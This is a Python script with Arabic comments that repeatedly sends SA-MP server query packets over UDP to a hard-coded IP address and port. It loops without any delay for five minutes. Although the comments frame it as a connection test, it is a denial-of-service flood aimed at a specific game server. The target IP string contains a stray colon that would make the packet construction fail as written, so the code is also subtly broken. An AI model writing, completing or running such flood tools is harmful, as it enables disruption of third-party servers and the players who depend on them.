import socket
import time

# حدد البيانات
TARGET_IP = "45.138.16.253:"  # استبدله بـ IP الهدف
TARGET_PORT = 7000       # استبدله بمنفذ السيرفر
DURATION = 300              # مدة الاختبار بالثواني

def test_connection():
    # إنشاء socket من نوع UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # تجهيز حزمة استعلام SAMP بالشكل الصحيح
        ip_bytes = socket.inet_aton(TARGET_IP)
        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
        payload = b'SAMP' + ip_bytes + port_bytes + b'i'
    except Exception as e:
        print(f"خطأ في تجهيز البيانات: {e}")
        return
    
    end_time = time.time() + DURATION
    count = 0
    
    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT} (تكرار مفتوح بدون مهلة)...")
    
    try:
        # تكرار مفتوح بالكامل بدون إبطاء (يستهلك المعالج بنسبة عالية لإعطاء أقصى سرعة إرسال)
        while time.time() < end_time:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
            
    except KeyboardInterrupt:
        print("\nتم إيقاف الاختبار يدوياً بواسطة المستخدم.")
    except Exception as e:
        print(f"حدث خطأ أثناء الإرسال: {e}")
    finally:
        client.close()
        print(f"تم إرسال {count} حزمة بنجاح.")

if __name__ == "__main__":
    test_connection()
    
